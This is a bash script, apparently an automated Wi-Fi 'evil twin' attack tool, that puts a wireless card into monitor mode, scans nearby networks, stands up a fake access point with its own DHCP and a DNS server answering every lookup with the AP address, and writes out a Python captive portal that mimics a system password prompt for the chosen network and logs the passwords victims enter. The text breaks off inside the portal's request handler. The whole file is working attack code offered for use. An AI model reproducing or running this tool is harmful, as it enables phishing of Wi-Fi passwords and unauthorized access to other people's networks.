#!/usr/bin/env bash

# Regular colors.
BLACK='\e[0;30m'        # black
RED='\e[0;31m'          # red
GREEN='\e[0;32m'        # green
YELLOW='\e[0;33m'       # yellow
BLUE='\e[0;34m'         # blue
PURPLE='\e[0;35m'       # purple
CYAN='\e[0;36m'         # cyan
WHITE='\e[0;37m'        # white

# Bold colors.
BOLD_BLACK='\e[1;30m'       # black
BOLD_RED='\e[1;31m'         # red
BOLD_GREEN='\e[1;32m'       # green
BOLD_YELLOW='\e[1;33m'      # yellow
BOLD_BLUE='\e[1;34m'        # blue
BOLD_PURPLE='\e[1;35m'      # purple
BOLD_CYAN='\e[1;36m'        # cyan
BOLD_WHITE='\e[1;37m'       # white

# Default
DEFAULT_FOREGROUND_COLOR='\e[39m'   # Default foreground color.

# Variables.
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
TMP_DIR="${SCRIPT_DIR}/tmp"

# Real LAN network variables.
IP_SUBNET=192.168.1.0
IP_MASK=255.255.255.0
IP_BROADCAST=192.168.1.255
IP_ROUTER=192.168.1.1
IP_RANGE_START=192.168.1.20
IP_RANGE_END=192.168.1.60
DNS=8.8.8.8

# Fake AP network variables.
AP_SUBNET=192.168.3.0
AP_MASK=255.255.255.0
AP_PREFIX=24
AP_BROADCAST=192.168.3.255
AP_ROUTER=192.168.3.1
AP_RANGE_START=192.168.3.20
AP_RANGE_END=192.168.3.60

DHCPD_CONF="/etc/dhcp/et-auto-dhcpd.conf"
DHCPD_LEASES="/var/lib/dhcp/dhcpd.leases-et-auto"
AP_IFACE=""
MON_IFACE=""

###########################################
# Get information of the chipset.
# Globals:
#   chipset
# Arguments:
#   interface
#   ethtool_output
# Returns:
#   None
###########################################
get_chipset() {
    local bus
    local bus_info
    local device_id
    local driver
    local interface=${1}
    local ethtool_output=${2}

    if [ -f /sys/class/net/${interface}/device/modalias ]; then
        bus="$(cut -d ":" -f 1 /sys/class/net/${interface}/device/modalias)"
        if [ "${bus}" = "usb" ]; then
            bus_info="$(cut -d ":" -f 2 /sys/class/net/${interface}/device/modalias | cut -b 1-10 | sed 's/^.//;s/p/:/')"
            chipset="$(lsusb -d "${bus_info}" | head -n1 - | cut -f3- -d ":" | sed 's/^....//;s/ Network Connection//g;s/ Wireless Adapter//g;s/^ //')"

        # Broadcom appears to define all the internal buses so we have to detect them here.
        elif [ "${bus}" = "pci" -o "${bus}" = "pcmcia" ]; then
            if [ -f /sys/class/net/${interface}/device/vendor ] && [ -f /sys/class/net/${interface}/device/device ]; then
                device_id="$(cat /sys/class/net/${interface}/device/vendor):$(cat /sys/class/net/${interface}/device/device)"
                chipset="$(lspci -d ${device_id} | cut -f3- -d ":" | sed 's/Wireless LAN Controller //g;s/ Network Connection//g;s/ Wireless Adapter//;s/^ //')"
            else
                bus_info="$(printf "${ethtool_output}" | grep bus-info | cut -d ":" -f "3-" | sed 's/^ //')"
                chipset="$(lspci | grep "${bus_info}" | head -n1 - | cut -f3- -d ":" | sed 's/Wireless LAN Controller //g;s/ Network Connection//g;s/ Wireless Adapter//;s/^ //')"
                device_id="$(lspci -nn | grep "${bus_info}" | grep '[[0-9][0-9][0-9][0-9]:[0-9][0-9][0-9][0-9]' -o)"
            fi
        elif [ "${bus}" = "sdio" ]; then
            if [ -f /sys/class/net/${interface}/device/vendor ] && [ -f /sys/class/net/${interface}/device/device ]; then
                device_id="$(cat /sys/class/net/${interface}/device/vendor):$(cat /sys/class/net/${interface}/device/device)"
            fi
            if [ "${device_id}" = '0x02d0:0x4330' ]; then
                chipset='Broadcom 4330'
            elif [ "${device_id}" = '0x02d0:0x4329' ]; then
                chipset='Broadcom 4329'
            elif [ "${device_id}" = '0x02d0:0x4334' ]; then
                chipset='Broadcom 4334'
            elif [ "${device_id}" = '0x02d0:0xa94c' ]; then
                chipset='Broadcom 43340'
            elif [ "${device_id}" = '0x02d0:0xa94d' ]; then
                chipset='Broadcom 43341'
            elif [ "${device_id}" = '0x02d0:0x4324' ]; then
                chipset='Broadcom 43241'
            elif [ "${device_id}" = '0x02d0:0x4335' ]; then
                chipset='Broadcom 4335/4339'
            elif [ "${device_id}" = '0x02d0:0xa962' ]; then
                chipset='Broadcom 43362'
            elif [ "${device_id}" = '0x02d0:0xa9a6' ]; then
                chipset='Broadcom 43430'
            elif [ "${device_id}" = '0x02d0:0x4345' ]; then
                chipset='Broadcom 43455'
            elif [ "${device_id}" = '0x02d0:0x4354' ]; then
                chipset='Broadcom 4354'
            elif [ "${device_id}" = '0x02d0:0xa887' ]; then
                chipset='Broadcom 43143'
            else
                chipset="unable to detect for sdio ${device_id}"
            fi
        else
            chipset="Not pci, usb, or sdio."
        fi
    elif [ -f /sys/class/net/${interface}/device/idVendor ] && [ -f /sys/class/net/${interface}/device/idProduct ]; then
        device_id="$(cat /sys/class/net/${interface}/device/idVendor):$(cat /sys/class/net/${interface}/device/idProduct)"
        chipset="$(lsusb | grep -i "${device_id}" | head -n1 - | cut -f3- -d ":" | sed 's/^....//;s/ Network Connection//g;s/ Wireless Adapter//g;s/^ //')"
    elif [ "${driver}" = "mac80211_hwsim" ]; then
        chipset="Software simulator of 802.11 radio(s) for mac80211"
    elif $(printf "${ethtool_output}" | awk '/bus-info/ {print $2}' | grep -q bcma); then
        bus="bcma"

        if [ "${driver}" = "brcmsmac" ] || [ "${driver}" = "brcmfmac" ] || [ "${driver}" = "b43" ]; then
            chipset="Broadcom on bcma bus, information limited"
        else
            chipset="Unrecognized driver \"${driver}\" on bcma bus"
        fi
    else
        chipset="non-mac80211 device? (report this!)"
    fi
}

###########################################
# Get WI-FI interfaces.
# Globals:
#   interface_list
#   interfaces_number
# Arguments:
#   get_only_wlan
# Returns:
#   None
###########################################
get_interfaces_list() {
    local get_only_wlan=${1}
    unset interface_list
    interfaces_number=0
    if [ "${get_only_wlan}" == true ]; then
        for interface in $(ls -1 /sys/class/net); do
            if [ -f /sys/class/net/${interface}/uevent ]; then
                if (( $(grep -q DEVTYPE=wlan /sys/class/net/${interface}/uevent) )); then
                    interface_list="${interface_list}\n ${interface}"
                fi
            fi
            interfaces_number=$((interfaces_number+1))
        done
        if [ -x "$(command -v iwconfig 2>&1)" ] && [ -x "$(command -v sort 2>&1)" ]; then
            for interface in $(iwconfig 2> /dev/null | sed 's/^\([a-zA-Z0-9_.]*\) .*/\1/'); do
                interface_list="${interface_list}\n ${interface}"
            done
            interface_list="$(printf "${interface_list}" | sort -bu)"
        fi
    else
        for interface in $(ls -1 /sys/class/net); do
            case "${interface}" in
                lo|veth*|tailscale0|at*)
                    continue
                    ;;
            esac
            if [ -f /sys/class/net/${interface}/uevent ]; then
                if (( $(grep -c DEVTYPE=bridge /sys/class/net/${interface}/uevent) == 0 )); then
                    interface_list="${interface_list}\n ${interface}"
                fi
            fi
            interfaces_number=$((interfaces_number+1))
        done

        interface_list="$(printf "${interface_list}" | sort -bu)"
    fi
}

###########################################
# Check if needed programs are installed.
# Globals:
#   None
# Arguments:
#   None
# Returns:
#   None
###########################################
check_programs() {
    missing_packages=""

    if [ -d /sys/bus/pci ] || [ -d /sys/bus/pci_express ] || [ -d /proc/bus/pci ]; then
        if [ ! -x "$(command -v lspci 2>&1)" ]; then
            missing_packages="${missing_packages} pciutils"
        fi
    fi

    if [ -d /sys/bus/usb ]; then
        if [ ! -x "$(command -v lsusb 2>&1)" ]; then
            missing_packages="${missing_packages} usbutils"
        fi
    fi

    if ! [ -x "$(command -v aircrack-ng 2>&1)" ]; then
        missing_packages="${missing_packages} aircrack-ng"
    fi

    if ! [ -x "$(command -v xterm 2>&1)" ]; then
        missing_packages="${missing_packages} xterm"
    fi

    if [[ "$(dpkg-query -l | grep -c isc-dhcp-server 2>/dev/null)" -eq 0 ]]; then
        missing_packages="${missing_packages} isc-dhcp-server"
    fi

    if ! [ -x "$(command -v python3 2>&1)" ]; then
        missing_packages="${missing_packages} python3"
    fi

    if ! [ -x "$(command -v openssl 2>&1)" ]; then
        missing_packages="${missing_packages} openssl"
    fi

    if ! [ -x "$(command -v hostapd 2>&1)" ]; then
        missing_packages="${missing_packages} hostapd"
    fi

    if [ -n "${missing_packages}" ]; then
        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Missing packages:${BOLD_YELLOW}${missing_packages}${WHITE}"
        echo ""
        echo -e -n "${WHITE}[${CYAN}?${WHITE}]${GREEN} Install them now? ${WHITE}[${GREEN}y${WHITE}/${RED}N${WHITE}]: "
        read install_answer
        case "${install_answer}" in
            [yY]|[yY][eE][sS])
                if [ -x "$(command -v apt-get 2>&1)" ]; then
                    apt-get install -y ${missing_packages}
                elif [ -x "$(command -v dnf 2>&1)" ]; then
                    dnf install -y ${missing_packages}
                elif [ -x "$(command -v yum 2>&1)" ]; then
                    yum install -y ${missing_packages}
                elif [ -x "$(command -v pacman 2>&1)" ]; then
                    pacman -S --noconfirm ${missing_packages}
                elif [ -x "$(command -v zypper 2>&1)" ]; then
                    zypper install -y ${missing_packages}
                else
                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No supported package manager found. Install manually:${WHITE}"
                    echo -e "${BOLD_YELLOW}    ${missing_packages}${WHITE}"
                    exit 1
                fi
                if [ $? -ne 0 ]; then
                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Installation failed.${WHITE}"
                    exit 1
                fi
                echo ""
                echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Packages installed successfully!${WHITE}"
                sleep 1
                packages_installed=true
                ;;
            *)
                echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Aborting. Install manually:${BOLD_YELLOW}${missing_packages}${WHITE}"
                exit 1
                ;;
        esac
    fi
}

###########################################
# Get chipsets of the interfaces.
# Globals:
#   chipsets_number
#   interfaces
#   chipsets
#   ethtool_output
# Arguments:
#   get_only_wlan
# Returns:
#   None
###########################################
get_interfaces_chipsets() {
    local get_only_wlan=${1}
    get_interfaces_list ${get_only_wlan}
    chipsets_number=0
    for interface in $(printf "${interface_list}"); do
        unset ethtool_output FROM FIRMWARE STACK MADWIFI MAC80211 BUSADDR chipset EXTENDED PHYDEV ifacet DRIVERt FIELD1 FIELD1t FIELD2 FIELD2t CHIPSETt

        if [ "${get_only_wlan}" == true ]; then
            ethtool_output="$(ethtool -i "${interface}" 2>&1)"
            if [ "${ethtool_output}" != "Cannot get driver information: Operation not supported" ]; then
                get_chipset ${interface} ${ethtool_output}
                interfaces["${chipsets_number}"]="${interface}"
                chipsets["${chipsets_number}"]="${chipset}"
            else
                echo -e ${WHITE}"[${RED}!${WHITE}]${GREEN} ${BOLD_PURPLE}ethtool${GREEN} failed${WHITE}..."
                echo ""
                echo -e ${WHITE}"[${RED}!${WHITE}]${GREEN} Only mac80211 devices on kernel 2.6.33 or higher are officially supported by airmon-ng${WHITE}."
                echo ""
                exit 1
            fi
            chipsets_number=$((chipsets_number+1))
        else
            get_chipset ${interface}
            interfaces["${chipsets_number}"]="${interface}"
            chipsets["${chipsets_number}"]="${chipset}"
            chipsets_number=$((chipsets_number+1))
        fi
    done
}

###########################################
# Create DHCPD config file.
# Globals:
#   None
# Arguments:
#   None
# Returns:
#   None
###########################################
create_dhcpd_config_file() {
    local file_path="${DHCPD_CONF}"
    mkdir -p "$(dirname "${file_path}")"
    rm -f "${file_path}"
    {
        echo -e "authoritative;"
        echo -e "default-lease-time 600;"
        echo -e "max-lease-time 7200;"
        echo -e "option domain-name-servers ${DNS};"
        echo -e "subnet ${AP_SUBNET} netmask ${AP_MASK} {"
        echo -e "\toption broadcast-address ${AP_BROADCAST};"
        echo -e "\toption routers ${AP_ROUTER};"
        echo -e "\toption subnet-mask ${AP_MASK};"
        echo -e "\trange ${AP_RANGE_START} ${AP_RANGE_END};"
        echo -e "}"
    } > "${file_path}"
    chmod 644 "${file_path}"
}

###########################################
# Get Wi-Fi hot spots list.
# Globals:
#   macs
#   channels
#   encryptions
#   essids
#   items_size
# Arguments:
#   wlan
# Returns:
#   None
###########################################
get_wifi_list() {
    wlan=${1}
    local capture_dir="${TMP_DIR}/capture"

    rm -rf "${capture_dir}"
    mkdir -p "${capture_dir}"
    trap - SIGINT SIGQUIT SIGTSTP

    airodump-ng -w "${capture_dir}/capture" --output-format csv -a "${wlan}"

    trap cleanup EXIT INT TERM

    local csv_file="${capture_dir}/capture-01.csv"
    local out_file="${capture_dir}/capture-02.csv"

    if [ ! -f "${csv_file}" ]; then
        items_size=0
        return
    fi

    local take_needed
    take_needed=$(grep -a -n 'Station\|CLIENT' "${csv_file}" | awk -F : '{print $1}')
    take_needed=$((take_needed - 1))

    if [ "${take_needed}" -le 0 ]; then
        cp "${csv_file}" "${out_file}"
    else
        head -n "${take_needed}" "${csv_file}" > "${out_file}" 2>&1
    fi

    local mac fts lts channel speed encryption cypher auth power beacon iv lan_ip id_length essid key

    items_size=0
    while IFS=',' read mac fts lts channel speed encryption cypher auth power beacon iv lan_ip id_length essid key; do
        mac_lenght=${#mac}
        if [ "${mac_lenght}" -ge 17 ]; then
            macs["${items_size}"]=${mac}
            channel="${channel## }"
            channels["${items_size}"]=${channel}
            encryptions["${items_size}"]=${encryption# }
            while [[ "${essid}" == " "* ]]; do essid="${essid# }"; done
            essid="${essid%$'\r'}"
            essids["${items_size}"]=${essid}
            items_size=$((items_size+1))
        fi
    done  < "${out_file}"
}

###########################################
# Select Wi-Fi from the hot spots list.
# Globals:
#   selected_essid
#   selected_bssid
#   selected_channel
# Arguments:
#   wlan
# Returns:
#   None
###########################################
select_wifi() {
    local wlan=${1}

    while true; do
        get_wifi_list ${wlan}
        unset selected_essid
        unset selected_bssid
        unset selected_channel

        echo -ne '\033c'
        print_header

        if [ "${items_size}" -eq 0 ]; then
            echo ""
            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No networks found.${WHITE}"
            echo ""
            echo -e -n "${WHITE}[${CYAN}?${WHITE}]${GREEN} ${BOLD_YELLOW}[r]${GREEN}escan ${WHITE}| ${BOLD_YELLOW}[b]${GREEN}ack ${WHITE}: "
            read choice
            case "${choice}" in
                [rR])
                    continue
                    ;;
                *)
                    attack_abort=true
                    return
                    ;;
            esac
        fi

        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}-------------------------------------${WHITE}+${YELLOW}-------------------${WHITE}+${YELLOW}-----${WHITE}+${YELLOW}------${WHITE}+"
        echo -e "${YELLOW}|${RED} ID ${YELLOW}|${RED} BSSID                               ${YELLOW}|${RED} ESSID             ${YELLOW}|${RED} CH  ${YELLOW}|${RED} ENC  ${YELLOW}|"
        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}-------------------------------------${WHITE}+${YELLOW}-------------------${WHITE}+${YELLOW}-----${WHITE}+${YELLOW}------${WHITE}+"

        for (( c=0; c<${items_size}; c++ )); do
            printf "${YELLOW}|${WHITE} %2d ${YELLOW}|${WHITE} %-35s ${YELLOW}|${WHITE} %-17s ${YELLOW}|${WHITE} %-3d ${YELLOW}|${WHITE} %-4s ${YELLOW}|\n" $((c+1)) "${essids[${c}]}" "${macs[${c}]}" ${channels[${c}]} "${encryptions[${c}]}"
        done

        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}-------------------------------------${WHITE}+${YELLOW}-------------------${WHITE}+${YELLOW}-----${WHITE}+${YELLOW}------${WHITE}+"

        local wifi_selection
        local is_wifi_selected=false

        while [[ "${is_wifi_selected}" != "true" ]]; do
            echo ""
            echo -e -n "${RED}[${CYAN}!${RED}]${WHITE} Select the ${BOLD_RED}number${WHITE} of wireless device ${WHITE}[${GREEN}1${WHITE}-${GREEN}${items_size}${WHITE}]: ${GREEN}"

            read wifi_selection
            if [[ "${wifi_selection}" =~ ^[+-]?[0-9]+$ ]]; then
                if [ "${wifi_selection}" -ge 1 ] && [ "${wifi_selection}" -le "${items_size}" ]; then
                    is_wifi_selected=true
                    wifi_index=$((wifi_selection-1))
                fi
            fi
        done

        selected_essid=${essids["${wifi_index}"]}
        selected_bssid=${macs["${wifi_index}"]}
        selected_channel=${channels["${wifi_index}"]}
        break
    done
}

###########################################
# Get chipsets of the internet interfaces.
# Globals:
#   lan
# Arguments:
#   None
# Returns:
#   None
###########################################
select_internet_interface() {
    local interfaces_number=$(ip -o link show 2>/dev/null | grep -v 'LOOPBACK' | grep 'UP' | wc -l)

    echo -ne '\033c'
    print_header
    echo ""
    echo -e ${WHITE}"[${RED}+${WHITE}]${GREEN} Scanning for internet interfaces${WHITE}..."

    if [ "${interfaces_number}" -ge 1 ]; then
        get_interfaces_chipsets false

        if [ "${chipsets_number}" -eq 0 ]; then
            echo ""
            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No internet interfaces found.${WHITE}"
            echo ""
            return
        fi

        echo -e ${WHITE}"[${RED}+${WHITE}]${GREEN} Found ${BOLD_PURPLE}${chipsets_number}${GREEN} internet interface(s)${WHITE}."
        echo ""

        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}----------------------${WHITE}+${YELLOW}---------------------------------------------------------${WHITE}+"
        echo -e "${YELLOW}|${RED} ID ${YELLOW}|${RED} Interfaces           ${YELLOW}|${RED} Chipsets                                                ${YELLOW}|"
        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}----------------------${WHITE}+${YELLOW}---------------------------------------------------------${WHITE}+"

        for (( c=0; c<${chipsets_number}; c++ )); do
            printf "${YELLOW}|${WHITE} %2d ${YELLOW}|${WHITE} %-20s ${YELLOW}|${WHITE} %-55s ${YELLOW}|\n" $((c+1)) "${interfaces[${c}]}" "${chipsets[${c}]:0:55}"
        done

        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}----------------------${WHITE}+${YELLOW}---------------------------------------------------------${WHITE}+"

        echo ""

        local interface_selection
        local is_interface_selected=false

        while [[ "${is_interface_selected}" != "true" ]]; do
            echo -en "\033[1A\033[2K"
            echo -e -n "${RED}[${CYAN}!${RED}]${WHITE} Select the ${BOLD_RED}number${WHITE} of internet interface ${WHITE}[${GREEN}1${WHITE}-${GREEN}${chipsets_number}${WHITE}]: ${GREEN}"

            read interface_selection
            if [[ "${interface_selection}" =~ ^[+-]?[0-9]+$ ]]; then
                if [ "${interface_selection}" -ge 1 ] && [ "${interface_selection}" -le "${chipsets_number}" ]; then
                    is_interface_selected=true
                    lan=${interfaces[$((interface_selection-1))]}
                fi
            fi
        done
    else
        echo ""
        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No internet interfaces found.${WHITE}"
        echo ""
    fi
}

###########################################
# Get chipsets of the interfaces.
# Globals:
#   wlan
# Arguments:
#   None
# Returns:
#   None
###########################################
select_interface() {
    local interfaces_number=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
    local interfaces_monitor_mode=`iwconfig 2>&1 | grep 'Mode:Monitor'`

    echo -ne '\033c'
    print_header
    echo ""
    echo -e ${WHITE}"[${RED}+${WHITE}]${GREEN} Scanning for wireless devices${WHITE}..."

    if [ "${interfaces_number}" -ge 1 ]; then
        get_interfaces_chipsets true

        if [ "${chipsets_number}" -eq 0 ]; then
            echo ""
            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No wireless interface found. Check your adapter.${WHITE}"
            echo ""
            return
        fi

        echo -e ${WHITE}"[${RED}+${WHITE}]${GREEN} Found ${BOLD_PURPLE}${chipsets_number}${GREEN} wireless device(s)${WHITE}."
        echo ""

        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}----------------------${WHITE}+${YELLOW}---------------------------------------------------------${WHITE}+"
        echo -e "${YELLOW}|${RED} ID ${YELLOW}|${RED} Interfaces           ${YELLOW}|${RED} Chipsets                                                ${YELLOW}|"
        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}----------------------${WHITE}+${YELLOW}---------------------------------------------------------${WHITE}+"

        for (( c=0; c<${chipsets_number}; c++ )); do
            printf "${YELLOW}|${WHITE} %2d ${YELLOW}|${WHITE} %-20s ${YELLOW}|${WHITE} %-55s ${YELLOW}|\n" $((c+1)) "${interfaces[${c}]}" "${chipsets[${c}]:0:55}"
        done

        echo -e "${WHITE}+${YELLOW}----${WHITE}+${YELLOW}----------------------${WHITE}+${YELLOW}---------------------------------------------------------${WHITE}+"

        echo ""

        local interface_selection
        local is_interface_selected=false

        while [[ "${is_interface_selected}" != "true" ]]; do
            echo -en "\033[1A\033[2K"
            echo -e -n "${RED}[${CYAN}!${RED}]${WHITE} Select the ${BOLD_RED}number${WHITE} of wireless device ${WHITE}[${GREEN}1${WHITE}-${GREEN}${chipsets_number}${WHITE}]: ${GREEN}"

            read interface_selection
            if [[ "${interface_selection}" =~ ^[+-]?[0-9]+$ ]]; then
                if [ "${interface_selection}" -ge 1 ] && [ "${interface_selection}" -le "${chipsets_number}" ]; then
                    is_interface_selected=true
                    wlan=${interfaces[$((interface_selection-1))]}
                fi
            fi
        done

        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Enabling monitor mode on ${BOLD_PURPLE}${wlan}${WHITE}."
        ip link set dev "${wlan}" down 2>/dev/null
        iw dev "${wlan}" set type monitor 2>/dev/null
        ip link set dev "${wlan}" up 2>/dev/null
        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Mode Monitor ${BOLD_GREEN}is enabled${WHITE}."

    elif [ -n "${interfaces_monitor_mode}" ]; then
        wlan=$(echo "${interfaces_monitor_mode}" | awk '{print $1}')
        echo ""
        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Interface ${BOLD_PURPLE}${wlan}${GREEN} is already in ${PURPLE}monitor mode${GREEN}. Using it.${WHITE}"
        echo ""
    else
        echo ""
        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Wireless Card is ${RED}not found${WHITE}. Check your adapter.${WHITE}"
        echo ""
    fi
}

###########################################
# Open new terminal window.
# Globals:
#   None
# Arguments:
#   command
#   title
# Returns:
#   None
###########################################
run_background() {
    local command=${1}
    local log_file="${TMP_DIR}/${2}.log"
    mkdir -p "${TMP_DIR}"
    echo "[$(date)] Running: ${command}" > "${log_file}"
    if [ -x "$(command -v xterm)" ] && [ -n "${DISPLAY:-}" ]; then
        xterm -hold -T "${2}" -e "${command}" >> "${log_file}" 2>&1 &
    else
        nohup bash -c "${command}" >> "${log_file}" 2>&1 &
    fi
}

print_header() {
    echo -e ${CYAN}   "    +${YELLOW}------------------------------------------------------------------${CYAN}+"
    echo -e ${YELLOW}   "    |                                                                  |"
    echo -e "     |${RED}    ███████╗████████╗    ${GREEN}█████╗ ██╗   ██╗████████╗ ██████╗ ${PURPLE}██╗   ${YELLOW} |"
    echo -e "     |${RED}    ██╔════╝╚══██╔══╝   ${GREEN}██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗${PURPLE}██║   ${YELLOW} |"
    echo -e "     |${BOLD_RED}    █████╗     ██║${WHITE}█████╗${BOLD_GREEN}███████║██║   ██║   ██║   ██║   ██║${BOLD_PURPLE}██║   ${YELLOW} |"
    echo -e "     |${BOLD_RED}    ██╔══╝     ██║${WHITE}╚════╝${BOLD_GREEN}██╔══██║██║   ██║   ██║   ██║   ██║${BOLD_PURPLE}╚═╝   ${YELLOW} |"
    echo -e "     |${RED}    ███████╗   ██║      ${GREEN}██║  ██║╚██████╔╝   ██║   ╚██████╔╝${PURPLE}██╗   ${YELLOW} |"
    echo -e "     |${RED}    ╚══════╝   ╚═╝      ${GREEN}╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ${PURPLE}╚═╝   ${YELLOW} |"
    echo -e ${YELLOW}   "    |                                                                  |"
    echo -e ${CYAN}   "    +${YELLOW}------------------------------------------------------------------${CYAN}+${YELLOW}"
    echo -e "                        |${BOLD_RED} Evil${BOLD_YELLOW} Twin${BOLD_PURPLE} Automated${BOLD_GREEN} Attack${YELLOW} |"
    echo -e "                        ${CYAN}+${YELLOW}----------------------------${CYAN}+"
}

create_captive_portal() {
    local essid="${1}"
    local script_path="${TMP_DIR}/captive_portal.py"
    local log_path="${TMP_DIR}/passwords.txt"
    local dns_script="${TMP_DIR}/dns_server.py"
    mkdir -p "${TMP_DIR}"

    cat > "${dns_script}" << 'PYEOF'
import socket, struct, datetime, sys, os

AP_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.3.1"
LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/dns.log"
PID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")

def log(msg):
    try:
        with open(LOG_FILE, "a") as f:
            f.write("[%s] %s\n" % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), msg))
    except Exception:
        pass

with open(PID_FILE, "w") as f:
    f.write(str(os.getpid()))

ip_bytes = socket.inet_aton(AP_IP)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    sock.bind((AP_IP, 53))
except OSError as e:
    log("FATAL: cannot bind %s:53 - %s" % (AP_IP, e))
    sys.exit(1)

log("listening on %s:53, resolving all domains to %s" % (AP_IP, AP_IP))

def decode_qname(data, pos):
    labels = []
    while pos < len(data):
        ln = data[pos]
        if ln == 0:
            return ".".join(labels), pos + 1
        labels.append(data[pos+1:pos+1+ln].decode("latin-1", errors="replace"))
        pos += 1 + ln
    return ".".join(labels), pos

while True:
    data, addr = sock.recvfrom(512)
    if len(data) < 12:
        continue
    tid = data[:2]
    qdcount = struct.unpack("!H", data[4:6])[0]
    pos = 12
    questions = b""
    answers = b""
    ancount = 0
    for _ in range(qdcount):
        end = data.find(b"\x00", pos)
        if end == -1:
            break
        qname = data[pos:end+1]
        qtype = data[end+1:end+3]
        qclass = data[end+3:end+5]
        domain, _ = decode_qname(data, pos)
        log("query %-40s from %s" % (domain, addr[0]))
        questions += qname + qtype + qclass
        if qtype == b"\x00\x01":
            answers += b"\xc0\x0c" + qtype + qclass + b"\x00\x00\x00\x1e\x00\x04" + ip_bytes
            ancount += 1
        pos = end + 5
    response = tid + b"\x81\x80" + struct.pack("!HHHH", qdcount, ancount, 0, 0) + questions + answers
    sock.sendto(response, addr)
PYEOF

    cat > "${script_path}" << 'PYEOF'
#!/usr/bin/env python3
import http.server, urllib.parse, sys, os, datetime, ssl, socket, threading

ESSID = sys.argv[1] if len(sys.argv) > 1 else "Network"
LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
HTTP_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
AP_IFACE = sys.argv[4] if len(sys.argv) > 4 else "at0"
HTTPS_PORT = 443

CERT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.crt")
KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.key")

if not os.path.exists(CERT_FILE):
    from subprocess import check_call
    check_call(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", KEY_FILE,
                "-out", CERT_FILE, "-days", "365", "-nodes",
                "-subj", "/C=XX/ST=XX/L=XX/O=XX/CN=192.168.3.1"],
               stdout=open(os.devnull, "wb"), stderr=open(os.devnull, "wb"))

LOGIN_PAGE = """<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to {essid}</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
.card {{ background: white; border-radius: 14px; padding: 30px; margin: 20px; max-width: 380px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.08); text-align: center; }}
.icon {{ font-size: 48px; margin-bottom: 12px; }}
h2 {{ font-size: 20px; font-weight: 600; color: #1c1c1e; margin-bottom: 6px; }}
p {{ font-size: 14px; color: #8e8e93; margin-bottom: 24px; }}
input {{ width: 100%; padding: 14px 16px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 16px; outline: none; transition: border 0.2s; }}
input:focus {{ border-color: #007aff; }}
button {{ width: 100%; padding: 14px; background: #007aff; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; }}
button:hover {{ background: #0056b3; }}
.error {{ color: #ff3b30; font-size: 13px; margin-top: 8px; display: none; }}
</style></head>
<body>
<div class="card">
<div class="icon">🔒</div>
<h2>"{essid}" Requires a Password</h2>
<p>Enter the network password to connect</p>
<form method="POST" action="/" onsubmit="document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='Connecting...'">
<input type="password" name="password" placeholder="Wi-Fi Password" autocomplete="off" required>
<div class="error" id="error">Incorrect password, try again</div>
<button type="submit" id="btn">Join Network</button>
</form>
</div></body></html>
"""

SUCCESS_PAGE = """<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
.card {{ background: white; border-radius: 14px; padding: 30px; margin: 20px; max-width: 380px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.08); text-align: center; }}
.check {{ font-size: 48px; color: #34c759; margin-bottom: 12px; }}
h2 {{ font-size: 20px; font-weight: 600; color: #1c1c1e; }}
p {{ font-size: 14px; color: #8e8e93; margin-top: 8px; }}
</style></head>
<body>
<div class="card">
<div class="check">&#10003;</div>
<h2>Connected Successfully</h2>
<p>You now have internet access.</p>
</div></body></html>
"""

AUTHED = False

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if AUTHED:
            self.send_response(200)
